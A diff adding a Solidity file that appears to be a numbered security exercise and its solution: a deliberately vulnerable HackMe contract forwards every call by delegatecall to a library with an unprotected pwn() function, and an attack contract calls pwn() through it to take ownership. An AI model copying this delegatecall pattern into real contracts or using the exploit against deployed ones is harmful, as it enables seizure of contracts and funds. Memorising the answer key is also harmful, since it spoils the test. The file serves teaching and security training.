@@ -1,0 +1,37 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.17;
+
+contract Lib {
+    address public owner;
+
+    function pwn() public {
+        owner = msg.sender;
+    }
+}
+
+contract HackMe {
+    address public owner;
+    Lib public lib;
+
+    constructor(Lib _lib) {
+        owner = msg.sender;
+        lib = _lib;
+    }
+
+    fallback() external payable {
+        address(lib).delegatecall(msg.data);
+    }
+}
+
+contract Question0015Solution {
+    HackMe hackMe;
+    constructor(HackMe _hackMe) {
+        hackMe = HackMe(_hackMe);
+    }
+    // Complete an attack function that 
+    // can change the owner of HackMe contract
+    // to the address of your Attack Contract.
+    function attack() public {
+        address(hackMe).call(abi.encodeWithSignature("pwn()"));
+    }
+}
